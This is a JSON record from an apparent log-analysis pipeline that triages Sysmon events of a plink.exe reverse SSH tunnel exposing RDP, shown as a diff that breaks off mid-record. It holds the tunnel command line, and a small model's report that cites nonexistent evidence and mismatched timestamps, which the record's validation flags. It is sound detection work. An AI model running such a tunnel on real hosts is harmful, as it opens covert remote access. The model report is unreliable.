@@ -1,0 +1,690 @@
+{
+  "analysis_id": "AN-20261024-142417-00bb",
+  "schema_version": "week2-1",
+  "task": "log_analysis",
+  "created_utc": "2026-10-24T14:24:17+00:00",
+  "references": {
+    "alert_id": null,
+    "incident_ref": null,
+    "note": "incident_ref is reserved for Week 3/4 correlation"
+  },
+  "input": {
+    "filename": "Mixed-Win-Linux-Net-QA.json",
+    "path": "Data\\Mixed-Win-Linux-Net-QA.json",
+    "sha256": "065cca374de2af6ccf70bd718bcc70ddccca8df852149fb98c039e970b64412c",
+    "format": "json",
+    "compressed": false,
+    "source_type": "windows",
+    "evidence_class": "user_supplied_unverified",
+    "event_count": 4,
+    "events_analysed": [
+      "E001",
+      "E002",
+      "E003",
+      "E004"
+    ],
+    "warnings": [
+      "Input is a subset of the classified file; unknown/conflicting events were withheld from AI."
+    ]
+  },
+  "model": {
+    "name": "mistral:7b-instruct-v0.3-q4_K_S",
+    "options": {
+      "temperature": 0.2,
+      "repeat_penalty": 1.15,
+      "num_ctx": 8192,
+      "num_predict": 2500,
+      "seed": 42
+    },
+    "attempts": [
+      {
+        "attempt": 1,
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "options": {
+          "temperature": 0.2,
+          "repeat_penalty": 1.15,
+          "num_ctx": 8192,
+          "num_predict": 2500,
+          "seed": 42
+        },
+        "outcome": "success",
+        "seconds": 103.62
+      }
+    ],
+    "retry_used": false,
+    "done_reason": "stop",
+    "tokens_per_second": 15.93,
+    "wall_seconds": 103.62
+  },
+  "prompt": {
+    "file": "log_analysis.txt",
+    "version": "w2-1.0",
+    "sha256": "7affc781ced6c1a991a75ba465d7aa9c429fac7a7dc3730cf3656342b0650b6d",
+    "nonce_delimiter_used": true,
+    "feedback": {
+      "knowledge_base": "Validated-SOC-Lessons.json",
+      "knowledge_base_sha256": "028eccd632c58e22511ccae31c791a9e26b7c8a04c87484340950f66d19a4da7",
+      "applied_reviewed_lesson_ids": [],
+      "general_guardrails_applied": false,
+      "method": "curated case-matched prompt guidance; not model fine-tuning"
+    }
+  },
+  "events": [
+    {
+      "ref": "E001",
+      "line_no": 1,
+      "raw": "{\"evidence_id\": \"E003\", \"timestamp\": \"2019-02-16T10:02:21.9344384Z\", \"event_id\": 1, \"record_id\": 1940899, \"provider\": \"Microsoft-Windows-Sysmon\", \"computer\": \"PC01.example.corp\", \"event_data\": {\"RuleName\": \"\", \"UtcTime\": \"2019-02-16 10:02:21.934\", \"ProcessGuid\": \"{365abb72-dfad-5c67-0000-0010e0811500}\", \"ProcessId\": \"2312\", \"Image\": \"C:\\\\Users\\\\IEUser\\\\Desktop\\\\plink.exe\", \"FileVersion\": \"Release 0.70\", \"Description\": \"Command-line SSH, Telnet, and Rlogin client\", \"Product\": \"PuTTY suite\", \"Company\": \"Simon Tatham\", \"CommandLine\": \"plink.exe  10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127.0.0.2:3389 -l test -pw [REDACTED] \"CurrentDirectory\": \"C:\\\\Users\\\\IEUser\\\\Desktop\\\\\", \"User\": \"PC01\\\\IEUser\", \"LogonGuid\": \"{365abb72-d6ab-5c67-0000-002056660200}\", \"LogonId\": \"0x26656\", \"TerminalSessionId\": \"1\", \"IntegrityLevel\": \"High\", \"Hashes\": \"SHA1=7806AD24F669CD8BB9EBE16F87E90173047F8EE4\", \"ParentProcessGuid\": \"{365abb72-d92a-5c67-0000-0010cb580900}\", \"ParentProcessId\": \"3904\", \"ParentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"ParentCommandLine\": \"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \"}}",
+      "timestamp_raw": "2019-02-16T10:02:21.9344384Z",
+      "timestamp_utc": "2019-02-16T10:02:21.934438+00:00",
+      "host": "PC01.example.corp",
+      "user": "PC01\\IEUser",
+      "src_ip": null,
+      "dst_ip": null,
+      "event_id": "1",
+      "source_kind": "windows",
+      "meta": {
+        "unified": {
+          "family": "windows",
+          "confidence": "high",
+          "reason": "Windows event provider; Structured Windows event; Windows event_data/data.win fields",
+          "transport": "file"
+        },
+        "original_source_kind": "windows",
+        "original_source": {
+          "file": "RT-01-C2-plink-focused.json",
+          "sha256": "1a5bee30293a99830627fd128d7aa003e4b6268bd722bdc3256c10f989cd62b7",
+          "ref": "E001",
+          "line_no": 1
+        },
+        "original_evidence_id": "E003"
+      },
+      "fields": {
+        "evidence_id": "E003",
+        "timestamp": "2019-02-16T10:02:21.9344384Z",
+        "event_id": 1,
+        "record_id": 1940899,
+        "provider": "Microsoft-Windows-Sysmon",
+        "computer": "PC01.example.corp",
+        "event_data.RuleName": "",
+        "event_data.UtcTime": "2019-02-16 10:02:21.934",
+        "event_data.ProcessGuid": "{365abb72-dfad-5c67-0000-0010e0811500}",
+        "event_data.ProcessId": "2312",
+        "event_data.Image": "C:\\Users\\IEUser\\Desktop\\plink.exe",
+        "event_data.FileVersion": "Release 0.70",
+        "event_data.Description": "Command-line SSH, Telnet, and Rlogin client",
+        "event_data.Product": "PuTTY suite",
+        "event_data.Company": "Simon Tatham",
+        "event_data.CommandLine": "plink.exe  10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127.0.0.2:3389 -l test -pw [REDACTED]",
+        "event_data.CurrentDirectory": "C:\\Users\\IEUser\\Desktop\\",
+        "event_data.User": "PC01\\IEUser",
+        "event_data.LogonGuid": "{365abb72-d6ab-5c67-0000-002056660200}",
+        "event_data.LogonId": "0x26656",
+        "event_data.TerminalSessionId": "1",
+        "event_data.IntegrityLevel": "High",
+        "event_data.Hashes": "SHA1=7806AD24F669CD8BB9EBE16F87E90173047F8EE4",
+        "event_data.ParentProcessGuid": "{365abb72-d92a-5c67-0000-0010cb580900}",
+        "event_data.ParentProcessId": "3904",
+        "event_data.ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "event_data.ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\" "
+      }
+    },
+    {
+      "ref": "E002",
+      "line_no": 2,
+      "raw": "{\"evidence_id\": \"E004\", \"timestamp\": \"2019-02-16T10:02:22.9659216Z\", \"event_id\": 3, \"record_id\": 1940900, \"provider\": \"Microsoft-Windows-Sysmon\", \"computer\": \"PC01.example.corp\", \"event_data\": {\"RuleName\": \"\", \"UtcTime\": \"2019-02-16 10:02:21.995\", \"ProcessGuid\": \"{365abb72-dfad-5c67-0000-0010e0811500}\", \"ProcessId\": \"2312\", \"Image\": \"C:\\\\Users\\\\IEUser\\\\Desktop\\\\plink.exe\", \"User\": \"PC01\\\\IEUser\", \"Protocol\": \"tcp\", \"Initiated\": \"true\", \"SourceIsIpv6\": \"false\", \"SourceIp\": \"10.0.2.17\", \"SourceHostname\": \"PC01.example.corp\", \"SourcePort\": \"49185\", \"SourcePortName\": \"\", \"DestinationIsIpv6\": \"false\", \"DestinationIp\": \"10.0.2.18\", \"DestinationHostname\": \"PC02\", \"DestinationPort\": \"80\", \"DestinationPortName\": \"http\"}}",
+      "timestamp_raw": "2019-02-16T10:02:22.9659216Z",
+      "timestamp_utc": "2019-02-16T10:02:22.965921+00:00",
+      "host": "PC01.example.corp",
+      "user": "PC01\\IEUser",
+      "src_ip": "10.0.2.17",
+      "dst_ip": "10.0.2.18",
+      "event_id": "3",
+      "source_kind": "windows",
+      "meta": {
+        "unified": {
+          "family": "windows",
+          "confidence": "high",
+          "reason": "Windows event provider; Structured Windows event",
+          "transport": "file"
+        },
+        "original_source_kind": "windows",
+        "original_source": {
+          "file": "RT-01-C2-plink-focused.json",
+          "sha256": "1a5bee30293a99830627fd128d7aa003e4b6268bd722bdc3256c10f989cd62b7",
+          "ref": "E002",
+          "line_no": 2
+        },
+        "original_evidence_id": "E004"
+      },
+      "fields": {
+        "evidence_id": "E004",
+        "timestamp": "2019-02-16T10:02:22.9659216Z",
+        "event_id": 3,
+        "record_id": 1940900,
+        "provider": "Microsoft-Windows-Sysmon",
+        "computer": "PC01.example.corp",
+        "event_data.RuleName": "",
+        "event_data.UtcTime": "2019-02-16 10:02:21.995",
+        "event_data.ProcessGuid": "{365abb72-dfad-5c67-0000-0010e0811500}",
+        "event_data.ProcessId": "2312",
+        "event_data.Image": "C:\\Users\\IEUser\\Desktop\\plink.exe",
+        "event_data.User": "PC01\\IEUser",
+        "event_data.Protocol": "tcp",
+        "event_data.Initiated": "true",
+        "event_data.SourceIsIpv6": "false",
+        "event_data.SourceIp": "10.0.2.17",
+        "event_data.SourceHostname": "PC01.example.corp",
+        "event_data.SourcePort": "49185",
+        "event_data.SourcePortName": "",
+        "event_data.DestinationIsIpv6": "false",
+        "event_data.DestinationIp": "10.0.2.18",
+        "event_data.DestinationHostname": "PC02",
+        "event_data.DestinationPort": "80",
+        "event_data.DestinationPortName": "http"
+      }
+    },
+    {
+      "ref": "E003",
+      "line_no": 3,
+      "raw": "{\"evidence_id\": \"E005\", \"timestamp\": \"2019-02-16T10:02:48.5026416Z\", \"event_id\": 3, \"record_id\": 1940901, \"provider\": \"Microsoft-Windows-Sysmon\", \"computer\": \"PC01.example.corp\", \"event_data\": {\"RuleName\": \"\", \"UtcTime\": \"2019-02-16 10:02:46.454\", \"ProcessGuid\": \"{365abb72-dfad-5c67-0000-0010e0811500}\", \"ProcessId\": \"2312\", \"Image\": \"C:\\\\Users\\\\IEUser\\\\Desktop\\\\plink.exe\", \"User\": \"PC01\\\\IEUser\", \"Protocol\": \"tcp\", \"Initiated\": \"true\", \"SourceIsIpv6\": \"false\", \"SourceIp\": \"127.0.0.1\", \"SourceHostname\": \"PC01.example.corp\", \"SourcePort\": \"49186\", \"SourcePortName\": \"\", \"DestinationIsIpv6\": \"false\", \"DestinationIp\": \"127.0.0.2\", \"DestinationHostname\": \"\", \"DestinationPort\": \"3389\", \"DestinationPortName\": \"ms-wbt-server\"}}",
+      "timestamp_raw": "2019-02-16T10:02:48.5026416Z",
+      "timestamp_utc": "2019-02-16T10:02:48.502641+00:00",
+      "host": "PC01.example.corp",
+      "user": "PC01\\IEUser",
+      "src_ip": "127.0.0.1",
+      "dst_ip": "127.0.0.2",
+      "event_id": "3",
+      "source_kind": "windows",
+      "meta": {
+        "unified": {
+          "family": "windows",
+          "confidence": "high",
+          "reason": "Windows event provider; Structured Windows event",
+          "transport": "file"
+        },
+        "original_source_kind": "windows",
+        "original_source": {
+          "file": "RT-01-C2-plink-focused.json",
+          "sha256": "1a5bee30293a99830627fd128d7aa003e4b6268bd722bdc3256c10f989cd62b7",
+          "ref": "E003",
+          "line_no": 3
+        },
+        "original_evidence_id": "E005"
+      },
+      "fields": {
+        "evidence_id": "E005",
+        "timestamp": "2019-02-16T10:02:48.5026416Z",
+        "event_id": 3,
+        "record_id": 1940901,
+        "provider": "Microsoft-Windows-Sysmon",
+        "computer": "PC01.example.corp",
+        "event_data.RuleName": "",
+        "event_data.UtcTime": "2019-02-16 10:02:46.454",
+        "event_data.ProcessGuid": "{365abb72-dfad-5c67-0000-0010e0811500}",
+        "event_data.ProcessId": "2312",
+        "event_data.Image": "C:\\Users\\IEUser\\Desktop\\plink.exe",
+        "event_data.User": "PC01\\IEUser",
+        "event_data.Protocol": "tcp",
+        "event_data.Initiated": "true",
+        "event_data.SourceIsIpv6": "false",
+        "event_data.SourceIp": "127.0.0.1",
+        "event_data.SourceHostname": "PC01.example.corp",
+        "event_data.SourcePort": "49186",
+        "event_data.SourcePortName": "",
+        "event_data.DestinationIsIpv6": "false",
+        "event_data.DestinationIp": "127.0.0.2",
+        "event_data.DestinationHostname": "",
+        "event_data.DestinationPort": "3389",
+        "event_data.DestinationPortName": "ms-wbt-server"
+      }
+    },
+    {
+      "ref": "E004",
+      "line_no": 4,
+      "raw": "{\"evidence_id\": \"E023\", \"timestamp\": \"2019-02-16T10:04:05.0927728Z\", \"event_id\": 3, \"record_id\": 1940919, \"provider\": \"Microsoft-Windows-Sysmon\", \"computer\": \"PC01.example.corp\", \"event_data\": {\"RuleName\": \"\", \"UtcTime\": \"2019-02-16 10:04:04.122\", \"ProcessGuid\": \"{365abb72-dfad-5c67-0000-0010e0811500}\", \"ProcessId\": \"2312\", \"Image\": \"C:\\\\Users\\\\IEUser\\\\Desktop\\\\plink.exe\", \"User\": \"PC01\\\\IEUser\", \"Protocol\": \"tcp\", \"Initiated\": \"true\", \"SourceIsIpv6\": \"false\", \"SourceIp\": \"127.0.0.1\", \"SourceHostname\": \"PC01.example.corp\", \"SourcePort\": \"49187\", \"SourcePortName\": \"\", \"DestinationIsIpv6\": \"false\", \"DestinationIp\": \"127.0.0.2\", \"DestinationHostname\": \"\", \"DestinationPort\": \"3389\", \"DestinationPortName\": \"ms-wbt-server\"}}",
+      "timestamp_raw": "2019-02-16T10:04:05.0927728Z",
+      "timestamp_utc": "2019-02-16T10:04:05.092772+00:00",
+      "host": "PC01.example.corp",
+      "user": "PC01\\IEUser",
+      "src_ip": "127.0.0.1",
+      "dst_ip": "127.0.0.2",
+      "event_id": "3",
+      "source_kind": "windows",
+      "meta": {
+        "unified": {
+          "family": "windows",
+          "confidence": "high",
+          "reason": "Windows event provider; Structured Windows event",
+          "transport": "file"
+        },
+        "original_source_kind": "windows",
+        "original_source": {
+          "file": "RT-01-C2-plink-focused.json",
+          "sha256": "1a5bee30293a99830627fd128d7aa003e4b6268bd722bdc3256c10f989cd62b7",
+          "ref": "E004",
+          "line_no": 4
+        },
+        "original_evidence_id": "E023"
+      },
+      "fields": {
+        "evidence_id": "E023",
+        "timestamp": "2019-02-16T10:04:05.0927728Z",
+        "event_id": 3,
+        "record_id": 1940919,
+        "provider": "Microsoft-Windows-Sysmon",
+        "computer": "PC01.example.corp",
+        "event_data.RuleName": "",
+        "event_data.UtcTime": "2019-02-16 10:04:04.122",
+        "event_data.ProcessGuid": "{365abb72-dfad-5c67-0000-0010e0811500}",
+        "event_data.ProcessId": "2312",
+        "event_data.Image": "C:\\Users\\IEUser\\Desktop\\plink.exe",
+        "event_data.User": "PC01\\IEUser",
+        "event_data.Protocol": "tcp",
+        "event_data.Initiated": "true",
+        "event_data.SourceIsIpv6": "false",
+        "event_data.SourceIp": "127.0.0.1",
+        "event_data.SourceHostname": "PC01.example.corp",
+        "event_data.SourcePort": "49187",
+        "event_data.SourcePortName": "",
+        "event_data.DestinationIsIpv6": "false",
+        "event_data.DestinationIp": "127.0.0.2",
+        "event_data.DestinationHostname": "",
+        "event_data.DestinationPort": "3389",
+        "event_data.DestinationPortName": "ms-wbt-server"
+      }
+    }
+  ],
+  "facts": [],
+  "ioc_context": [
+    {
+      "type": "ipv4",
+      "value": "10.0.2.17",
+      "refs": [
+        "E002"
+      ],
+      "count": 1,
+      "scope": "private (RFC 1918)",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "ipv4",
+      "value": "10.0.2.18",
+      "refs": [
+        "E001",
+        "E002"
+      ],
+      "count": 2,
+      "scope": "private (RFC 1918)",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "ipv4",
+      "value": "127.0.0.1",
+      "refs": [
+        "E003",
+        "E004"
+      ],
+      "count": 2,
+      "scope": "loopback",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "ipv4",
+      "value": "127.0.0.2",
+      "refs": [
+        "E001",
+        "E003",
+        "E004"
+      ],
+      "count": 3,
+      "scope": "loopback",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "ipv4",
+      "value": "127.0.0.3",
+      "refs": [
+        "E001"
+      ],
+      "count": 1,
+      "scope": "loopback",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "domain",
+      "value": "pc01.example.corp",
+      "refs": [
+        "E001",
+        "E002",
+        "E003",
+        "E004"
+      ],
+      "count": 4,
+      "scope": "",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "hash",
+      "value": "7806ad24f669cd8bb9ebe16f87e90173047f8ee4",
+      "refs": [
+        "E001"
+      ],
+      "count": 1,
+      "scope": "",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "filename",
+      "value": "cmd.exe",
+      "refs": [
+        "E001"
+      ],
+      "count": 1,
+      "scope": "",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "filename",
+      "value": "plink.exe",
+      "refs": [
+        "E001",
+        "E002",
+        "E003",
+        "E004"
+      ],
+      "count": 4,
+      "scope": "",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "username",
+      "value": "PC01\\IEUser",
+      "refs": [
+        "E001",
+        "E002",
+        "E003",
+        "E004"
+      ],
+      "count": 4,
+      "scope": "",
+      "reputation": "External reputation not checked."
+    },
+    {
+      "type": "hostname",
+      "value": "PC01.example.corp",
+      "refs": [
+        "E001",
+        "E002",
+        "E003",
+        "E004"
+      ],
+      "count": 4,
+      "scope": "",
+      "reputation": "External reputation not checked."
+    }
+  ],
+  "risk_signals": [],
+  "benign_context": [],
+  "evidence_timeline": [
+    {
+      "timestamp": "2019-02-16T10:02:21.9344384Z",
+      "timestamp_utc": "2019-02-16T10:02:21.934438+00:00",
+      "event": "{\"evidence_id\": \"E003\", \"timestamp\": \"2019-02-16T10:02:21.9344384Z\", \"event_id\": 1, \"record_id\": 1940899, \"provider\": \"Microsoft-Windows-Sysmon\", \"computer\": \"P ...[truncated 927 chars]",
+      "source": "windows",
+      "host_user": "PC01.example.corp / PC01\\IEUser",
+      "evidence_ref": "E001"
+    },
+    {
+      "timestamp": "2019-02-16T10:02:22.9659216Z",
+      "timestamp_utc": "2019-02-16T10:02:22.965921+00:00",
+      "event": "{\"evidence_id\": \"E004\", \"timestamp\": \"2019-02-16T10:02:22.9659216Z\", \"event_id\": 3, \"record_id\": 1940900, \"provider\": \"Microsoft-Windows-Sysmon\", \"computer\": \"P ...[truncated 561 chars]",
+      "source": "windows",
+      "host_user": "PC01.example.corp / PC01\\IEUser",
+      "evidence_ref": "E002"
+    },
+    {
+      "timestamp": "2019-02-16T10:02:48.5026416Z",
+      "timestamp_utc": "2019-02-16T10:02:48.502641+00:00",
+      "event": "{\"evidence_id\": \"E005\", \"timestamp\": \"2019-02-16T10:02:48.5026416Z\", \"event_id\": 3, \"record_id\": 1940901, \"provider\": \"Microsoft-Windows-Sysmon\", \"computer\": \"P ...[truncated 568 chars]",
+      "source": "windows",
+      "host_user": "PC01.example.corp / PC01\\IEUser",
+      "evidence_ref": "E003"
+    },
+    {
+      "timestamp": "2019-02-16T10:04:05.0927728Z",
+      "timestamp_utc": "2019-02-16T10:04:05.092772+00:00",
+      "event": "{\"evidence_id\": \"E023\", \"timestamp\": \"2019-02-16T10:04:05.0927728Z\", \"event_id\": 3, \"record_id\": 1940919, \"provider\": \"Microsoft-Windows-Sysmon\", \"computer\": \"P ...[truncated 568 chars]",
+      "source": "windows",
+      "host_user": "PC01.example.corp / PC01\\IEUser",
+      "evidence_ref": "E004"
+    }
+  ],
+  "ai_output": {
+    "raw_text": "## EXECUTIVE SUMMARY\nThe activity shows a user running plink.exe with reverse SSH forwarding, RDP port 3389 and password authentication on PC01. The connection events suggest that the SSH tunnel or RDP session may have been established, but it is unclear if this was authorized.\n\n## LOG SOURCE\nSource type: Microsoft-Windows-Sysmon, Hosts: [PC01.example.corp], Time span: 2019-02-16T10:02:21.9344384Z - 2019-02-16T10:04:05.0927728Z\n\n## SIGNIFICANT SECURITY EVENTS\n- [E001] Command line execution of plink.exe with reverse SSH forwarding, RDP port 3389 and password authentication on PC01 ([E003])\n- [E002] TCP connection event initiated from PC01 to PC02 on port 80 ([E004])\n- [E003] TCP connection event initiated from localhost (PC01) to localhost (PC01) on ports 49185 and 49186 ([E005])\n- [E004] TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49187 ([E006])\n\n## SUSPICIOUS ACTIVITIES\n- Unauthorized use of plink.exe with reverse SSH forwarding and RDP port 3389 ([E001], [E005], [E006])\n\n## EVIDENCE REFERENCES\n- [E001] Shows command line execution of plink.exe on PC01 with reverse SSH forwarding, RDP port 3389 and password authentication\n- [E002] Shows TCP connection event initiated from PC01 to PC02 on port 80\n- [E003] Shows TCP connection event initiated from localhost (PC01) to localhost (PC01) on ports 49185 and 49186\n- [E004] Shows TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49187\n- [E005] Shows SHA1 hash of plink.exe as 7806AD24F669CD8BB9EBE16F87E90173047F8EE4\n\n## INCIDENT TIMELINE\n| Timestamp | Event | Source | Host/User | Evidence Ref |\n|---|---|---|---|---|\n| 2019-02-16T10:02:21.9344384Z | Command line execution of plink.exe on PC01 with reverse SSH forwarding, RDP port 3389 and password authentication | Microsoft-Windows-Sysmon | PC01\\IEUser | [E001] |\n| 2019-02-16T10:02:22.9659216Z | TCP connection event initiated from PC01 to PC02 on port 80 | Microsoft-Windows-Sysmon | PC01\\IEUser | [E002] |\n| 2019-02-16T10:02:46.454 | TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49185 | Microsoft-Windows-Sysmon | PC01\\IEUser | [E003] |\n| 2019-02-16T10:02:48.5026416Z | TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49186 | Microsoft-Windows-Sysmon | PC01\\IEUser | [E005] |\n| 2019-02-16T10:04:04.122 | TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49187 | Microsoft-Windows-Sysmon | PC01\\IEUser | [E004] |\n\n## EXTRACTED IOCS\n- Type: File hash, Value: SHA1=7806AD24F669CD8BB9EBE16F87E90173047F8EE4 ([E005])\n\n## POTENTIAL ATTACK INDICATORS\n- Unauthorized use of plink.exe with reverse SSH forwarding and RDP port 3389 ([E001], [E005], [E006])\n- TCP connection event initiated from PC01 to an external host on port 80 ([E002])\n\n## CONFIDENCE AND UNCERTAINTY\nLow | Medium | High\n---|---|----\nUncertainty: Authorization for the use of plink.exe with reverse SSH forwarding and RDP port 3389, External reputation not checked.\n\n## MISSING INFORMATION\n- Approval or authorization for the use of plink.exe with reverse SSH forwarding and RDP port 3389 on PC01\n- External reputation of IP addresses involved in the connection events (PC01, PC02)\n\n## RECOMMENDED INVESTIGATION STEPS\n1. Investigate whether the use of plink.exe with reverse SSH forwarding and RDP port 3389 on PC01 was authorized.\n2. Check the external reputation of IP addresses involved in the connection events (PC01, PC02).\n3. Review logs for other instances of unauthorized use of plink.exe or similar tools.\n4. Investigate if there are any related network traffic patterns or anomalies.\n5. Determine if there were any successful connections to external hosts on port 80 from PC01 ([E002]).",
+    "sections": {
+      "EXECUTIVE SUMMARY": "The activity shows a user running plink.exe with reverse SSH forwarding, RDP port 3389 and password authentication on PC01. The connection events suggest that the SSH tunnel or RDP session may have been established, but it is unclear if this was authorized.",
+      "LOG SOURCE": "Source type: Microsoft-Windows-Sysmon, Hosts: [PC01.example.corp], Time span: 2019-02-16T10:02:21.9344384Z - 2019-02-16T10:04:05.0927728Z",
+      "SIGNIFICANT SECURITY EVENTS": "- [E001] Command line execution of plink.exe with reverse SSH forwarding, RDP port 3389 and password authentication on PC01 ([E003])\n- [E002] TCP connection event initiated from PC01 to PC02 on port 80 ([E004])\n- [E003] TCP connection event initiated from localhost (PC01) to localhost (PC01) on ports 49185 and 49186 ([E005])\n- [E004] TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49187 ([E006])",
+      "SUSPICIOUS ACTIVITIES": "- Unauthorized use of plink.exe with reverse SSH forwarding and RDP port 3389 ([E001], [E005], [E006])",
+      "EVIDENCE REFERENCES": "- [E001] Shows command line execution of plink.exe on PC01 with reverse SSH forwarding, RDP port 3389 and password authentication\n- [E002] Shows TCP connection event initiated from PC01 to PC02 on port 80\n- [E003] Shows TCP connection event initiated from localhost (PC01) to localhost (PC01) on ports 49185 and 49186\n- [E004] Shows TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49187\n- [E005] Shows SHA1 hash of plink.exe as 7806AD24F669CD8BB9EBE16F87E90173047F8EE4",
+      "INCIDENT TIMELINE": "| Timestamp | Event | Source | Host/User | Evidence Ref |\n|---|---|---|---|---|\n| 2019-02-16T10:02:21.9344384Z | Command line execution of plink.exe on PC01 with reverse SSH forwarding, RDP port 3389 and password authentication | Microsoft-Windows-Sysmon | PC01\\IEUser | [E001] |\n| 2019-02-16T10:02:22.9659216Z | TCP connection event initiated from PC01 to PC02 on port 80 | Microsoft-Windows-Sysmon | PC01\\IEUser | [E002] |\n| 2019-02-16T10:02:46.454 | TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49185 | Microsoft-Windows-Sysmon | PC01\\IEUser | [E003] |\n| 2019-02-16T10:02:48.5026416Z | TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49186 | Microsoft-Windows-Sysmon | PC01\\IEUser | [E005] |\n| 2019-02-16T10:04:04.122 | TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49187 | Microsoft-Windows-Sysmon | PC01\\IEUser | [E004] |",
+      "EXTRACTED IOCS": "- Type: File hash, Value: SHA1=7806AD24F669CD8BB9EBE16F87E90173047F8EE4 ([E005])",
+      "POTENTIAL ATTACK INDICATORS": "- Unauthorized use of plink.exe with reverse SSH forwarding and RDP port 3389 ([E001], [E005], [E006])\n- TCP connection event initiated from PC01 to an external host on port 80 ([E002])",
+      "CONFIDENCE AND UNCERTAINTY": "Low | Medium | High\n---|---|----\nUncertainty: Authorization for the use of plink.exe with reverse SSH forwarding and RDP port 3389, External reputation not checked.",
+      "MISSING INFORMATION": "- Approval or authorization for the use of plink.exe with reverse SSH forwarding and RDP port 3389 on PC01\n- External reputation of IP addresses involved in the connection events (PC01, PC02)",
+      "RECOMMENDED INVESTIGATION STEPS": "1. Investigate whether the use of plink.exe with reverse SSH forwarding and RDP port 3389 on PC01 was authorized.\n2. Check the external reputation of IP addresses involved in the connection events (PC01, PC02).\n3. Review logs for other instances of unauthorized use of plink.exe or similar tools.\n4. Investigate if there are any related network traffic patterns or anomalies.\n5. Determine if there were any successful connections to external hosts on port 80 from PC01 ([E002])."
+    },
+    "truncated": false,
+    "timeline_rows": [
+      {
+        "timestamp": "2019-02-16T10:02:21.9344384Z",
+        "event": "Command line execution of plink.exe on PC01 with reverse SSH forwarding, RDP port 3389 and password authentication",
+        "source": "Microsoft-Windows-Sysmon",
+        "host_user": "PC01\\IEUser",
+        "evidence_ref": "[E001]",
+        "refs_found": [
+          "E001"
+        ]
+      },
+      {
+        "timestamp": "2019-02-16T10:02:22.9659216Z",
+        "event": "TCP connection event initiated from PC01 to PC02 on port 80",
+        "source": "Microsoft-Windows-Sysmon",
+        "host_user": "PC01\\IEUser",
+        "evidence_ref": "[E002]",
+        "refs_found": [
+          "E002"
+        ]
+      },
+      {
+        "timestamp": "2019-02-16T10:02:46.454",
+        "event": "TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49185",
+        "source": "Microsoft-Windows-Sysmon",
+        "host_user": "PC01\\IEUser",
+        "evidence_ref": "[E003]",
+        "refs_found": [
+          "E003"
+        ]
+      },
+      {
+        "timestamp": "2019-02-16T10:02:48.5026416Z",
+        "event": "TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49186",
+        "source": "Microsoft-Windows-Sysmon",
+        "host_user": "PC01\\IEUser",
+        "evidence_ref": "[E005]",
+        "refs_found": [
+          "E005"
+        ]
+      },
+      {
+        "timestamp": "2019-02-16T10:04:04.122",
+        "event": "TCP connection event initiated from localhost (PC01) to localhost (PC01) on port 49187",
+        "source": "Microsoft-Windows-Sysmon",
+        "host_user": "PC01\\IEUser",
+        "evidence_ref": "[E004]",
+        "refs_found": [
+          "E004"
+        ]
+      }
+    ]
+  },
+  "grounding": {
+    "version": "grounded-detection-1.0",
+    "scope": "observed_input_events_only",
+    "events_inspected": 4,
+    "behavioral_findings": [],
+    "context_observations": [],
+    "final_incident_verdict": "human_review_required",
+    "guarantees": [
+      "No LLM inference",
+      "No proof of attack success",
+      "No SOAR actions"
+    ]
+  },
+  "validation": {
+    "flags": [
+      {
+        "check": "nonexistent_evidence_ref",
+        "severity": "high",
+        "section": "SIGNIFICANT SECURITY EVENTS",
+        "value": "E005",
+        "message": "Evidence reference does not exist in the input.",
+        "analyst_disposition": "Unreviewed",
+        "id": "F001"
+      },
+      {
+        "check": "nonexistent_evidence_ref",
+        "severity": "high",
+        "section": "SIGNIFICANT SECURITY EVENTS",
+        "value": "E006",
+        "message": "Evidence reference does not exist in the input.",
+        "analyst_disposition": "Unreviewed",
+        "id": "F002"
+      },
+      {
+        "check": "unsupported_authorization_status",
+        "severity": "medium",
+        "section": "SUSPICIOUS ACTIVITIES",
+        "value": "- Unauthorized use of plink.exe with reverse SSH forwarding and RDP port 3389 ([E001], [E005], [E006])",
+        "message": "The source events do not independently establish that the activity was unauthorized; verify approval and context.",
+        "analyst_disposition": "Unreviewed",
+        "id": "F003"
+      },
+      {
+        "check": "unsupported_authorization_status",
+        "severity": "medium",
+        "section": "POTENTIAL ATTACK INDICATORS",
+        "value": "- Unauthorized use of plink.exe with reverse SSH forwarding and RDP port 3389 ([E001], [E005], [E006])",
+        "message": "The source events do not independently establish that the activity was unauthorized; verify approval and context.",
+        "analyst_disposition": "Unreviewed",
+        "id": "F004"
+      },
+      {
+        "check": "timeline_timestamp_mismatch",
+        "severity": "high",
+        "section": "INCIDENT TIMELINE",
+        "value": "2019-02-16T10:02:46.454",
+        "message": "Timestamp does not appear in the cited event(s) E003.",
+        "analyst_disposition": "Unreviewed",
+        "id": "F005"
+      },
+      {
+        "check": "timeline_timestamp_mismatch",
+        "severity": "high",
+        "section": "INCIDENT TIMELINE",
+        "value": "2019-02-16T10:04:04.122",
+        "message": "Timestamp does not appear in the cited event(s) E004.",
+        "analyst_disposition": "Unreviewed",
+        "id": "F006"
+      }
+    ],
+    "severity_counts": {
+      "high": 4,
+      "medium": 2,
+      "low": 0
+    },
+    "automated_checks": [
+      "structure/truncation",
